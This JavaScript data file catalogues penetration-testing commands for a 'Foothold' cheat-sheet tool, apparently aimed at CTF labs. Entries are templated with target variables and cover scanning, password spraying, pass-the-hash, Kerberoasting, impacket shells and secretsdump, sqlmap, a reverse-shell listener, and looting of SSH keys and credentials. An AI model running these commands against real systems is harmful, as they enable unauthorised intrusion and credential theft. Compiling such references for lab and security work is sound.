/* Foothold command catalogue and lookup tables.
   Loaded as a classic <script> so index.html still works from file://.
   Also importable from Node for tests. */
/* ========================================================================
   DATA — edit / extend this. One object = one card.
   phase: recon|enum|access|privesc|lateral|web|post
   tags : linux|windows|ad|web|net|any     (OS filter)
   ports: [numbers]                        (By-Port + Scan modes; omit for generic steps)
   {{TOKENS}} in cmd auto-fill from the Target bar.
   ===================================================================== */
const VARS = [
  {k:"IP",ph:"10.10.10.10"},{k:"DOMAIN",ph:"corp.local"},{k:"DC_IP",ph:"10.10.10.2"},
  {k:"USER",ph:"j.doe"},{k:"PASS",ph:"Password1"},{k:"HASH",ph:"NTLM hash"},
  {k:"LHOST",ph:"10.10.14.5"},{k:"LPORT",ph:"443"},{k:"PORTS",ph:"22,80,445"},
  {k:"WORDLIST",ph:"/usr/share/seclists/…/common.txt"}
];

const PHASES = [
  {id:"recon",label:"Recon",hue:"var(--ph-recon)"},
  {id:"enum",label:"Enumeration",hue:"var(--ph-enum)"},
  {id:"access",label:"Foothold",hue:"var(--ph-access)"},
  {id:"privesc",label:"Privilege Esc",hue:"var(--ph-privesc)"},
  {id:"lateral",label:"AD / Lateral",hue:"var(--ph-lateral)"},
  {id:"web",label:"Web",hue:"var(--ph-web)"},
  {id:"post",label:"Post / Loot",hue:"var(--ph-post)"}
];

/* port number -> short service label (By-Port tiles + Scan headers) */
const SERVICES = {
  21:"FTP",22:"SSH",25:"SMTP",53:"DNS",80:"HTTP",88:"Kerberos",110:"POP3",111:"NFS",
  135:"MSRPC",139:"NetBIOS",143:"IMAP",161:"SNMP",389:"LDAP",443:"HTTPS",445:"SMB",
  636:"LDAPS",1433:"MSSQL",2049:"NFS",3268:"GlobalCat",3306:"MySQL",3389:"RDP",
  5432:"Postgres",5985:"WinRM",5986:"WinRM/S",6379:"Redis",
  69:"TFTP",79:"Finger",873:"rsync",1521:"Oracle",2375:"Docker",3000:"Grafana",5900:"VNC",
  8000:"HTTP-alt",8080:"HTTP-alt",8443:"HTTPS-alt",8089:"Splunk",9200:"Elastic",10000:"Webmin",
  11211:"Memcache",27017:"MongoDB"
};

const HT   = u => ({t:"HackTricks",u});
const PEAS = {t:"PEASS-ng",u:"https://github.com/peass-ng/PEASS-ng"};
const GTFO = {t:"GTFOBins",u:"https://gtfobins.github.io/"};
const NXC  = {t:"NetExec",u:"https://www.netexec.wiki/"};
const IMP  = {t:"Impacket",u:"https://github.com/fortra/impacket"};

const DATA = [
  /* ===== RECON ===== */
  {phase:"recon",cat:"Port scanning",tags:["net"],title:"Full TCP port sweep",
    cmd:"nmap -p- --min-rate 1000 -T4 {{IP}}",note:"Fast pass over all 65535 ports to find what is open.",
    src:HT("https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/")},
  {phase:"recon",cat:"Port scanning",tags:["net"],title:"Service & script scan",
    cmd:"nmap -sC -sV -p{{PORTS}} {{IP}} -oN nmap.txt",note:"Versions and default scripts on the open ports — paste this into Scan mode.",
    src:{t:"nmap",u:"https://nmap.org/book/man-briefoptions.html"}},
  {phase:"recon",cat:"Port scanning",tags:["net"],title:"Rustscan → nmap",
    cmd:"rustscan -a {{IP}} -- -sC -sV",note:"Very fast discovery that pipes straight into nmap.",
    src:{t:"RustScan",u:"https://github.com/RustScan/RustScan"}},
  {phase:"recon",cat:"Port scanning",tags:["net"],title:"Top UDP services",
    cmd:"nmap -sU --top-ports 20 {{IP}}",note:"Catches SNMP, DNS, TFTP and other UDP-only services.",
    src:{t:"nmap",u:"https://nmap.org/book/scan-methods-udp-scan.html"}},
  {phase:"recon",cat:"Host discovery",tags:["net"],title:"Live hosts on a subnet",
    cmd:"nmap -sn {{IP}}/24",note:"Ping sweep to map which hosts answer on the network.",
    src:{t:"nmap",u:"https://nmap.org/book/host-discovery.html"}},

  /* ===== 21 FTP ===== */
  {phase:"enum",cat:"FTP",tags:["net"],ports:[21],title:"Anonymous login",
    cmd:"ftp {{IP}}",note:"Try anonymous / anonymous and look for readable files.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/")},
  {phase:"enum",cat:"FTP",tags:["net"],ports:[21],title:"Mirror everything",
    cmd:"wget -r ftp://anonymous:anonymous@{{IP}}/",note:"Recursively pull all files the anonymous user can read.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/")},

  /* ===== 22 SSH ===== */
  {phase:"access",cat:"SSH",tags:["linux","net"],ports:[22],title:"Log in",
    cmd:"ssh {{USER}}@{{IP}}",note:"Straight login once you have a username and password.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html")},
  {phase:"access",cat:"SSH",tags:["net"],ports:[22],title:"Brute / spray login",
    cmd:"hydra -l {{USER}} -P {{WORDLIST}} {{IP}} ssh",note:"Test one user against a wordlist (also works on ftp, http-form, etc).",
    src:{t:"Hydra",u:"https://github.com/vanhauser-thc/thc-hydra"}},
  {phase:"privesc",cat:"SSH",tags:["any"],ports:[22],title:"Crack a key passphrase",
    cmd:"ssh2john id_rsa > hash && john hash",note:"Recover the passphrase on a private key you looted.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html")},

  /* ===== 25 SMTP ===== */
  {phase:"enum",cat:"SMTP",tags:["net"],ports:[25],title:"User enumeration",
    cmd:"nc {{IP}} 25   # then: VRFY {{USER}}",note:"VRFY / RCPT TO often confirm which users exist.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/")},

  /* ===== 53 DNS ===== */
  {phase:"enum",cat:"DNS",tags:["net"],ports:[53],title:"Zone transfer",
    cmd:"dig axfr {{DOMAIN}} @{{IP}}",note:"A misconfigured server hands over every record at once.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html")},

  /* ===== 80 / 443 HTTP(S) ===== */
  {phase:"enum",cat:"Web content",tags:["web"],ports:[80,443,8000,8080,8443],title:"Directory brute force",
    cmd:"feroxbuster -u http://{{IP}} -w {{WORDLIST}}",note:"Recursively find hidden directories and files.",
    src:{t:"feroxbuster",u:"https://github.com/epi052/feroxbuster"}},
  {phase:"enum",cat:"Web content",tags:["web"],ports:[80,443,8000,8080,8443],title:"Fingerprint the stack",
    cmd:"whatweb http://{{IP}}",note:"Identify the server, CMS, frameworks and versions.",
    src:{t:"WhatWeb",u:"https://github.com/urbanadventurer/WhatWeb"}},
  {phase:"enum",cat:"Web content",tags:["web"],ports:[80,443],title:"Virtual host discovery",
    cmd:"ffuf -u http://{{IP}} -H \"Host: FUZZ.{{DOMAIN}}\" -w {{WORDLIST}} -fs 0",
    note:"Reveal name-based vhosts hidden behind one IP.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/")},
  {phase:"enum",cat:"Web content",tags:["web"],ports:[80,443,8000,8080,8443],title:"Misconfig scan",
    cmd:"nikto -h http://{{IP}}",note:"Quick sweep for known server misconfigurations.",
    src:{t:"Nikto",u:"https://github.com/sullo/nikto"}},
  {phase:"enum",cat:"Web content",tags:["web"],ports:[80,443],title:"WordPress enumeration",
    cmd:"wpscan --url http://{{IP}} --enumerate u,vp",note:"Enumerate WordPress users and vulnerable plugins.",
    src:{t:"WPScan",u:"https://github.com/wpscanteam/wpscan"}},
  {phase:"enum",cat:"Web content",tags:["web"],ports:[443],title:"Inspect TLS",
    cmd:"sslscan {{IP}}:443",note:"Weak ciphers and cert details sometimes leak hostnames.",
    src:{t:"testssl.sh",u:"https://testssl.sh/"}},

  /* ===== 88 Kerberos ===== */
  {phase:"enum",cat:"Kerberos",tags:["ad"],ports:[88],title:"Validate usernames",
    cmd:"kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} {{WORDLIST}}",
    note:"Confirm which usernames exist without locking accounts.",
    src:{t:"kerbrute",u:"https://github.com/ropnop/kerbrute"}},
  {phase:"lateral",cat:"Kerberos",tags:["ad"],ports:[88],title:"AS-REP roasting",
    cmd:"impacket-GetNPUsers {{DOMAIN}}/ -usersfile users.txt -dc-ip {{DC_IP}} -no-pass",
    note:"Accounts without pre-auth hand out crackable hashes.",
    src:HT("https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html")},
  {phase:"lateral",cat:"Kerberos",tags:["ad"],ports:[88],title:"Kerberoasting",
    cmd:"impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{DC_IP}} -request",
    note:"Service-account tickets you can crack offline.",
    src:HT("https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html")},

  /* ===== 111 / 2049 NFS ===== */
  {phase:"enum",cat:"NFS",tags:["net"],ports:[111,2049],title:"List exports",
    cmd:"showmount -e {{IP}}",note:"See which shares are exported, then mount them locally.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html")},

  /* ===== 135 MSRPC ===== */
  {phase:"enum",cat:"MSRPC",tags:["windows","ad"],ports:[135],title:"Dump RPC endpoints",
    cmd:"impacket-rpcdump {{IP}}",note:"Map the exposed RPC services on the host.",
    src:IMP},
  {phase:"lateral",cat:"MSRPC",tags:["windows","ad"],ports:[135],title:"Command exec (WMI)",
    cmd:"impacket-wmiexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",note:"Semi-interactive shell over WMI, no service created.",
    src:IMP},

  /* ===== 139 / 445 SMB ===== */
  {phase:"enum",cat:"SMB",tags:["windows","net"],ports:[139,445],title:"List shares (null session)",
    cmd:"smbclient -L //{{IP}} -N",note:"Try to list shares with no credentials.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/")},
  {phase:"enum",cat:"SMB",tags:["windows","net"],ports:[139,445],title:"enum4linux-ng",
    cmd:"enum4linux-ng -A {{IP}}",note:"Users, groups, shares and OS info over SMB/RPC.",
    src:{t:"enum4linux-ng",u:"https://github.com/cddmp/enum4linux-ng"}},
  {phase:"enum",cat:"SMB",tags:["windows","ad"],ports:[445],title:"Shares & access (NetExec)",
    cmd:"netexec smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --shares",note:"Enumerate shares and read/write access.",src:NXC},
  {phase:"lateral",cat:"SMB",tags:["ad"],ports:[445],title:"Password spray",
    cmd:"netexec smb {{IP}} -u users.txt -p '{{PASS}}' --continue-on-success",note:"One password against many users across hosts.",src:NXC},
  {phase:"lateral",cat:"SMB",tags:["ad"],ports:[445],title:"Pass-the-hash",
    cmd:"netexec smb {{IP}} -u {{USER}} -H {{HASH}}",note:"Authenticate with an NTLM hash, no cleartext password.",
    src:HT("https://book.hacktricks.wiki/en/windows-hardening/ntlm/")},
  {phase:"lateral",cat:"SMB",tags:["windows","ad"],ports:[445],title:"Shell via PsExec",
    cmd:"impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",note:"SYSTEM shell when the user is a local admin.",src:IMP},
  {phase:"lateral",cat:"SMB",tags:["ad"],ports:[445],title:"Dump secrets (with admin)",
    cmd:"impacket-secretsdump {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",note:"Pull local or domain hashes once you have admin.",src:IMP},

  /* ===== 161 SNMP ===== */
  {phase:"enum",cat:"SNMP",tags:["net"],ports:[161],title:"Walk the tree",
    cmd:"snmpwalk -v2c -c public {{IP}}",note:"Default 'public' community string often leaks a lot.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/")},

  /* ===== 389 / 3268 LDAP ===== */
  {phase:"enum",cat:"LDAP",tags:["ad"],ports:[389,3268],title:"Anonymous bind search",
    cmd:"ldapsearch -x -H ldap://{{IP}} -b \"DC=…\" ",note:"Dump directory objects if anonymous binds are allowed.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html")},
  {phase:"enum",cat:"LDAP",tags:["ad"],ports:[389],title:"Enumerate users (RPC)",
    cmd:"rpcclient -U '' -N {{IP}} -c enumdomusers",note:"List domain users over a null RPC session.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpc/")},
  {phase:"lateral",cat:"LDAP",tags:["ad"],ports:[389],title:"Map the domain (BloodHound)",
    cmd:"bloodhound-python -d {{DOMAIN}} -u {{USER}} -p {{PASS}} -c all -ns {{DC_IP}}",
    note:"Collect the AD graph to find attack paths to Domain Admin.",
    src:{t:"BloodHound",u:"https://bloodhound.specterops.io/"}},

  /* ===== 1433 MSSQL ===== */
  {phase:"lateral",cat:"MSSQL",tags:["windows","ad"],ports:[1433],title:"Connect",
    cmd:"impacket-mssqlclient {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}} -windows-auth",note:"Authenticated SQL shell; try enable_xp_cmdshell for exec.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/")},
  {phase:"enum",cat:"MSSQL",tags:["ad"],ports:[1433],title:"Check access (NetExec)",
    cmd:"netexec mssql {{IP}} -u {{USER}} -p {{PASS}}",note:"Validate creds and privileges against MSSQL.",src:NXC},

  /* ===== 3306 MySQL / 5432 Postgres / 6379 Redis ===== */
  {phase:"enum",cat:"MySQL",tags:["net"],ports:[3306],title:"Connect",
    cmd:"mysql -h {{IP}} -u {{USER}} -p",note:"Weak or reused DB creds often open the box.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html")},
  {phase:"enum",cat:"PostgreSQL",tags:["net"],ports:[5432],title:"Connect",
    cmd:"psql -h {{IP}} -U {{USER}}",note:"Default postgres / postgres is worth a try.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html")},
  {phase:"enum",cat:"Redis",tags:["net"],ports:[6379],title:"Connect unauthenticated",
    cmd:"redis-cli -h {{IP}}",note:"Open Redis can leak data or be abused to write files.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-redis.html")},

  /* ===== 3389 RDP ===== */
  {phase:"lateral",cat:"RDP",tags:["windows"],ports:[3389],title:"Connect",
    cmd:"xfreerdp /v:{{IP}} /u:{{USER}} /p:{{PASS}} +clipboard",note:"Graphical session once you have valid creds.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html")},

  /* ===== 5985 / 5986 WinRM ===== */
  {phase:"lateral",cat:"WinRM",tags:["ad","windows"],ports:[5985,5986],title:"Shell (Evil-WinRM)",
    cmd:"evil-winrm -i {{IP}} -u {{USER}} -p {{PASS}}",note:"Interactive shell when the user is in Remote Management Users.",
    src:{t:"Evil-WinRM",u:"https://github.com/Hackplayers/evil-winrm"}},
  {phase:"enum",cat:"WinRM",tags:["ad"],ports:[5985,5986],title:"Check access (NetExec)",
    cmd:"netexec winrm {{IP}} -u {{USER}} -p {{PASS}}",note:"'(Pwn3d!)' means you can get a shell here.",src:NXC},

  /* ===== FOOTHOLD (generic) ===== */
  {phase:"access",cat:"Finding exploits",tags:["any"],title:"Search public exploits",
    cmd:"searchsploit <product> <version>",note:"Look up known exploits for a service name and version.",
    src:{t:"Exploit-DB",u:"https://www.exploit-db.com/searchsploit"}},
  {phase:"access",cat:"Shells",tags:["any"],title:"Start a listener",
    cmd:"nc -lvnp {{LPORT}}",note:"Catch an incoming reverse shell.",
    src:HT("https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/linux.html")},
  {phase:"access",cat:"Shells",tags:["linux"],title:"Upgrade to a full TTY",
    cmd:"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    note:"Then Ctrl-Z, stty raw -echo, fg — turns a dumb shell interactive.",
    src:HT("https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/full-ttys.html")},
  {phase:"access",cat:"Shells",tags:["any"],title:"Reverse shell generator",
    cmd:"# build one for {{LHOST}}:{{LPORT}} → revshells.com",
    note:"Reference site that writes a reverse shell in many languages.",
    src:{t:"revshells.com",u:"https://www.revshells.com/"}},

  /* ===== PRIVESC: LINUX ===== */
  {phase:"privesc",cat:"Linux",tags:["linux"],title:"Sudo rights",
    cmd:"sudo -l",note:"What can this user run as root? Check each binary on GTFOBins.",src:GTFO},
  {phase:"privesc",cat:"Linux",tags:["linux"],title:"SUID binaries",
    cmd:"find / -perm -4000 -type f 2>/dev/null",note:"Root-owned SUID files; cross-reference GTFOBins.",src:GTFO},
  {phase:"privesc",cat:"Linux",tags:["linux"],title:"Automated enum (linPEAS)",
    cmd:"./linpeas.sh",note:"Highlights likely Linux privilege-escalation paths.",src:PEAS},
  {phase:"privesc",cat:"Linux",tags:["linux"],title:"Capabilities",
    cmd:"getcap -r / 2>/dev/null",note:"Binaries with capabilities like cap_setuid can grant root.",
    src:HT("https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html")},
  {phase:"privesc",cat:"Linux",tags:["linux"],title:"Cron jobs",
    cmd:"cat /etc/crontab; ls -la /etc/cron.*",note:"Writable scripts run on a schedule as root.",
    src:HT("https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/")},

  /* ===== PRIVESC: WINDOWS ===== */
  {phase:"privesc",cat:"Windows",tags:["windows"],title:"Token privileges",
    cmd:"whoami /priv",note:"SeImpersonate / SeAssignPrimaryToken enable the Potato attacks.",
    src:HT("https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/")},
  {phase:"privesc",cat:"Windows",tags:["windows"],title:"Automated enum (winPEAS)",
    cmd:"winpeas.exe",note:"Highlights likely Windows privilege-escalation paths.",src:PEAS},
  {phase:"privesc",cat:"Windows",tags:["windows"],title:"OS build for kernel exploits",
    cmd:"systeminfo",note:"Feed the build number to wesng to match missing patches.",
    src:{t:"wesng",u:"https://github.com/bitsadmin/wesng"}},
  {phase:"privesc",cat:"Windows",tags:["windows"],title:"Weak service permissions",
    cmd:"wmic service get name,pathname,startmode",note:"Unquoted paths and writable service binaries.",
    src:HT("https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/")},
  {phase:"privesc",cat:"Windows",tags:["windows"],title:"Stored credentials",
    cmd:"cmdkey /list",note:"Saved creds can be reused with runas /savecred.",
    src:HT("https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/")},

  /* ===== WEB ===== */
  {phase:"web",cat:"Injection",tags:["web"],title:"SQL injection (sqlmap)",
    cmd:"sqlmap -u \"http://{{IP}}/?id=1\" --batch --dbs",note:"Detect and exploit SQLi, then enumerate databases.",
    src:{t:"sqlmap",u:"https://github.com/sqlmapproject/sqlmap/wiki"}},
  {phase:"web",cat:"Injection",tags:["web"],title:"Payload reference",
    cmd:"# LFI / SSTI / XSS / SQLi → PayloadsAllTheThings",note:"Curated, categorised payloads for almost every web bug class.",
    src:{t:"PayloadsAllTheThings",u:"https://github.com/swisskyrepo/PayloadsAllTheThings"}},
  {phase:"web",cat:"Discovery",tags:["web"],title:"Hidden parameters",
    cmd:"ffuf -u \"http://{{IP}}/?FUZZ=test\" -w {{WORDLIST}} -fs 0",note:"Find undocumented GET/POST parameters.",
    src:{t:"ffuf",u:"https://github.com/ffuf/ffuf/wiki"}},
  {phase:"web",cat:"Manual testing",tags:["web"],title:"Intercept & replay",
    cmd:"# Burp Suite → Proxy → Repeater",note:"The core manual loop: intercept, tamper, resend.",
    src:{t:"PortSwigger",u:"https://portswigger.net/web-security"}},

  /* ===== MORE SERVICES (common on CTF / HTB) ===== */
  {phase:"enum",cat:"TFTP",tags:["net"],ports:[69],title:"Grab a file",
    cmd:"tftp {{IP}} -c get <file>",note:"No auth; pull known filenames (configs, backups).",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/69-udp-tftp.html")},
  {phase:"enum",cat:"Finger",tags:["net"],ports:[79],title:"User enumeration",
    cmd:"finger @{{IP}}",note:"Lists valid / logged-in users on old Unix hosts.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-finger.html")},
  {phase:"enum",cat:"POP3 / IMAP",tags:["net"],ports:[110,143],title:"Read mail",
    cmd:"nc {{IP}} 110   # USER {{USER}} / PASS {{PASS}}",note:"Mailboxes often hold creds and hints.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html")},
  {phase:"enum",cat:"rsync",tags:["net"],ports:[873],title:"List modules",
    cmd:"rsync -av rsync://{{IP}}/",note:"Open rsync shares can expose or receive files.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html")},
  {phase:"enum",cat:"Oracle DB",tags:["net"],ports:[1521],title:"Enumerate (odat)",
    cmd:"odat all -s {{IP}}",note:"SID guessing, cred checks and privilege enumeration for Oracle.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/")},
  {phase:"lateral",cat:"Docker API",tags:["linux"],ports:[2375],title:"Exposed daemon",
    cmd:"docker -H {{IP}}:2375 ps",note:"An open Docker socket is usually root on the host.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html")},
  {phase:"enum",cat:"Grafana",tags:["web"],ports:[3000],title:"Default login",
    cmd:"# browse http://{{IP}}:3000  (admin / admin)",note:"Try default creds; check the version for known CVEs.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/3000-pentesting-grafana.html")},
  {phase:"enum",cat:"VNC",tags:["net"],ports:[5900],title:"Connect",
    cmd:"vncviewer {{IP}}:5900",note:"Often weak / no auth; hydra -s 5900 for brute.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html")},
  {phase:"enum",cat:"Splunk",tags:["web"],ports:[8089],title:"Management API",
    cmd:"curl -sk https://{{IP}}:8089/services/server/info -u {{USER}}:{{PASS}}",
    note:"Splunkd REST API; check the version and default creds.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/8089-splunkd.html")},
  {phase:"enum",cat:"Elasticsearch",tags:["web"],ports:[9200],title:"List indices",
    cmd:"curl http://{{IP}}:9200/_cat/indices",note:"Unauthenticated ES exposes all stored data.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/9200-pentesting-elasticsearch.html")},
  {phase:"enum",cat:"Webmin",tags:["web"],ports:[10000],title:"Login page",
    cmd:"# browse https://{{IP}}:10000",note:"Check the version for well-known Webmin CVEs.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/")},
  {phase:"enum",cat:"Memcached",tags:["net"],ports:[11211],title:"Dump stats",
    cmd:"nc {{IP}} 11211   # then: stats",note:"Unauth memcached can leak cached data.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/11211-memcache/")},
  {phase:"enum",cat:"MongoDB",tags:["net"],ports:[27017],title:"Connect",
    cmd:"mongosh mongodb://{{IP}}:27017",note:"No-auth Mongo exposes every database.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html")},

  /* ===== POST / LOOT ===== */
  {phase:"post",cat:"Looting",tags:["linux","windows"],title:"Hunt for credentials",
    cmd:"grep -rniE 'password|secret|api[_-]?key' . 2>/dev/null",note:"Config files, histories and source often hold reusable creds.",
    src:HT("https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/")},
  {phase:"post",cat:"Looting",tags:["linux"],title:"Reusable SSH keys",
    cmd:"cat ~/.ssh/id_rsa",note:"Private keys let you move laterally to other hosts.",
    src:HT("https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html")},
  {phase:"post",cat:"Looting",tags:["any"],title:"History & environment",
    cmd:"history; env",note:"Commands and variables sometimes expose passwords or tokens.",
    src:HT("https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/")}
];

const OS_FILTERS = [
  {k:"all",label:"All"},{k:"linux",label:"Linux"},{k:"windows",label:"Windows"},
  {k:"ad",label:"Active Directory"},{k:"web",label:"Web"},{k:"net",label:"Network"}
];

const SERVICE_ALIASES={ftp:21,ssh:22,smtp:25,dns:53,domain:53,http:80,https:443,ssl:443,
  kerberos:88,"kerberos-sec":88,pop3:110,nfs:111,rpcbind:111,msrpc:135,netbios:139,"netbios-ssn":139,
  imap:143,snmp:161,ldap:389,"microsoft-ds":445,smb:445,ldaps:636,mssql:1433,"ms-sql-s":1433,
  "global catalog":3268,mysql:3306,rdp:3389,"ms-wbt-server":3389,postgres:5432,postgresql:5432,
  winrm:5985,wsman:5985,redis:6379,tftp:69,finger:79,rsync:873,oracle:1521,"oracle-tns":1521,
  docker:2375,grafana:3000,vnc:5900,"http-proxy":8080,"http-alt":8080,splunk:8089,splunkd:8089,
  elasticsearch:9200,webmin:10000,memcached:11211,memcache:11211,mongodb:27017,mongo:27017};

const HT_SLUG={21:"pentesting-ftp",22:"pentesting-ssh.html",25:"pentesting-smtp",53:"pentesting-dns.html",
  80:"pentesting-web",110:"pentesting-pop",111:"nfs-service-pentesting.html",135:"pentesting-rpc",139:"pentesting-smb",
  143:"pentesting-imap.html",161:"pentesting-snmp",389:"pentesting-ldap.html",443:"pentesting-web",445:"pentesting-smb",
  636:"pentesting-ldap.html",1433:"pentesting-mssql-microsoft-sql-server",3306:"pentesting-mysql.html",
  3389:"pentesting-rdp.html",5432:"pentesting-postgresql.html",5985:"pentesting-winrm.html",6379:"pentesting-redis.html"};

if (typeof module !== "undefined") {
  module.exports = { VARS, PHASES, SERVICES, DATA, OS_FILTERS, SERVICE_ALIASES, HT_SLUG };
}
